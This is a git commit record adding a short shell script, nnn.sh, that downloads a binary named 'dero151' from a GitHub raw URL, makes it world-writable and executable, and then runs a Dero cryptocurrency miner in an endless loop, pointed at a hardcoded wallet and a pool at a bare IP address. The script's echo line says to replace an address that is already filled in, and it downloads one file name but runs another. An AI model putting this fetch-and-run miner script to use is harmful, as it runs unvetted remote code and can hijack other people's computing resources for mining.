dda09675dd785eeb80a1ccf8499204f67cf85ad9
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-25 03:17:16 +0700

    Update and rename asia.sh to nnn.sh

---
+++ nnn.sh
@@ -0,0 +1,9 @@
+wget https://github.com/aqshakuy/der/raw/main/dero151
+chmod 777 dero151
+
+#!/bin/bash
+echo "Replace YOUR_ADDRESS to run the miner"
+while :; do
+    ./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x639pf6zmdnrcwsmtuta9 -r 170.187.197.220:443 -p stratum;
+    sleep 5;
+done
